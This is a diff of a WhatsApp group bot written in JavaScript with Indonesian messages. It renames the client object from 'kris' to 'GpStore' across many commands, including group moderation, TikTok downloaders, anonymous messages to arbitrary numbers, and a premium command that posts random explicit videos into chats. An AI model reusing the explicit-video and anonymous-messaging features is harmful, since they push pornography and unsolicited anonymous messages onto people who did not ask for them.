+GpStore.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
 } catch (err) {
 reply(`Belum Ada User Yang Jadibot`)
 }
@@ -1297,7 +1297,7 @@ case 'hentaivid': {
 if (!isPrem) return replyprem(mess.premium)
 sbe = await hentaivid()
 cejd = sbe[Math.floor(Math.random(), sbe.length)]
-kris.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
+GpStore.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
 caption: `�? Title : ${cejd.title}
 �? Category : ${cejd.category}
 �? Mimetype : ${cejd.type}
@@ -1310,11 +1310,11 @@ break
 case 'menfes': case 'confes':
 if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
 if (m.isGroup) return reply(mess.private)
-if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 62882007324217|Hai Owner`)
+if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 62858428854987|Hai Owner`)
 if (text > 700) return reply(`Teks Kepanjangan`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 pesan = q.split('|')[1]
-let cekno = await kris.onWhatsApp(num)
+let cekno = await GpStore.onWhatsApp(num)
 if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
 if (num === m.sender) return reply(`Tidak Bisa Menfess Ke Nomor Sendiri!!!`)
 if (num === botNumber) return reply(`Tidak Bisa Menfess Ke Nomor bot!!!`)
@@ -1322,7 +1322,7 @@ var nomor = m.sender
 let buttons = [
 { buttonId: '.leave', buttonText: { displayText: 'Biarin' }, type: 1 }
 ]
-await kris.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
+await GpStore.sendButtonText(num, buttons, `Hi Saya Bot Ada Yang Kirim Pesan Ke Kamu
 Seseorang Temanmu
 (Pengirim Rahasia)
 
@@ -1337,7 +1337,7 @@ Kamu Bisa Menggunakan Bot Ini
 Contoh Penggunaan: ${prefix+command} nomor|pesan untuknya
 
 Contoh: ${prefix+command} 628xxxxxxxx|hai owner`, m)
-await kris.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : ftext })
+await GpStore.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, { quoted : ftext })
 lidt = `Sukses Mengirim Pesan
 👤 Dari : wa.me/${nomor.split("@s.whatsapp.net")[0]}
 👥 Ke : wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}
@@ -1355,14 +1355,14 @@ return reply(lidt)
 }
 break
 case 'leave':{
-if (m.isGroup && itsMekris && command == "leave") return kris.groupLeave(from)
+if (m.isGroup && itsMeGpStore && command == "leave") return GpStore.groupLeave(from)
 if (m.isGroup) return reply("Only private chat")
 var room = Object.values(anon.anonymous).find(p => p.check(sender))
 if (!room) return reply("Anda tidak berada didalam room")
 reply("Bye...")
 var other = room.other(sender)
 delete anon.anonymous[room.id]
-if (other != "") kris.sendMessage(other, {
+if (other != "") GpStore.sendMessage(other, {
 text: "Bye..."
 })
 if (command == "leave") break;
@@ -1378,7 +1378,7 @@ m.reply(`${m.pushName} sekarang afk\nAlasan : ${args.join(" ") ? args.join(" ") 
 break
 case 'antilink':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antilink) return reply('*Sudah Aktif!*')
@@ -1393,12 +1393,12 @@ let buttons = [
 { buttonId: '.antilink on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antilink off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
+await GpStore.sendButtonText(m.chat, buttons, `Mode Antilink`, `Pilih On Atau Off`, m)
 }
 break
 case 'welcome':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (welcome) return reply('*Sudah Aktif!*')
@@ -1413,12 +1413,12 @@ let buttons = [
 { buttonId: '.welcome on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.welcome off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Mode welcome`, `Pilih On Atau Off`, m)
+await GpStore.sendButtonText(m.chat, buttons, `Mode welcome`, `Pilih On Atau Off`, m)
 }
 break
 case 'antiwame':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[0] == 'on') {
 if (antiwame) return reply('*Sudah Aktif!*')
@@ -1433,20 +1433,20 @@ let buttons = [
 { buttonId: '.antiwame on', buttonText: { displayText: 'On' }, type: 1 },
 { buttonId: '.antiwame off', buttonText: { displayText: 'Off' }, type: 1 }
 ]
-await kris.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
+await GpStore.sendButtonText(m.chat, buttons, `Mode Antiwame`, `Pilih On Atau Off`, m)
 }
 break
 case 'add': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await kris.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'closetime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1463,13 +1463,13 @@ reply(`Close time ${q} dimulai dari sekarang`)
 setTimeout(() => {
 var nomor = m.participant
 const close = `*Tepat waktu* grup ditutup oleh admin\nsekarang hanya admin yang dapat mengirim pesan`
-kris.groupSettingUpdate(from, 'announcement')
+GpStore.groupSettingUpdate(from, 'announcement')
 reply(close)
 }, timer)
 break
 case 'opentime':
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (args[1] == 'detik') {
 var timer = args[0] * `1000`
@@ -1486,52 +1486,52 @@ reply(`Open time ${q} dimulai dari sekarang`)
 setTimeout(() => {
 var nomor = m.participant
 const open = `*Tepat waktu* grup dibuka oleh admin\n sekarang member dapat mengirim pesan`
-kris.groupSettingUpdate(from, 'not_announcement')
+GpStore.groupSettingUpdate(from, 'not_announcement')
 reply(open)
 }, timer)
 break
 case 'kick': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await kris.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'promote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await kris.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'demote': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
-await kris.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
+await GpStore.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
 }
 break
 case 'hidetag': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
-kris.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
+GpStore.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
 }
 break
 case 'tagall': {
 if (!m.isGroup) return reply(mess.group)
-if (!isAdmins && !itsMekris) return reply(mess.admin)
+if (!isAdmins && !itsMeGpStore) return reply(mess.admin)
 if (!isBotAdmins) return reply(mess.botAdmin)
 if (!q) return reply(`Teks?`)
 let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\n══✪�? *👥 Tag All* 〙✪══\n`
 for (let mem of participants) {
 teks += `�? @${mem.id.split('@')[0]}\n`
 }
-kris.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
+GpStore.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
 }
 break
 case 'ebinary': {
@@ -1551,13 +1551,13 @@ break
 case 'tiktokvideo':{
 if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
 let res = await tiktokdl(q)
-kris.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
+GpStore.sendMessage(m.chat,{video:{url: res.media[1].url},caption: `${mess.succes}`},{quoted:m})
 }
 break
 case 'tiktokaudio':{
 if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
 let tytyd = await tiktokdl(q)
-kris.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
+GpStore.sendMessage(m.chat,{audio:{url: tytyd.media[2].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
 }
 break
 case 'googles': {
@@ -1596,7 +1596,7 @@ Hasil : ${kay.hasil_nya}
 Tingkat Kesulitan : ${kay.tingkat_kesulitan}
 Bahan :
 ${kay.bahan_nya}`
-kris.sendMessage(m.chat,{
+GpStore.sendMessage(m.chat,{
 image:{
 url:kay.thumb_nya},
 caption:dty,
@@ -1624,7 +1624,7 @@ rows: list_rows
 }],
 listType: 1
 }
-const sendMsg = await kris.sendMessage(from, buttonNya)
+const sendMsg = await GpStore.sendMessage(from, buttonNya)
 break
 case 'play':{
 if (!text) return reply(`Example : ${prefix+command} story wa anime`)
@@ -1632,7 +1632,7 @@ let search = await yts(text)
 url = search.videos[0].url
 let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
 eek = await getBuffer(anu.thumbnail)
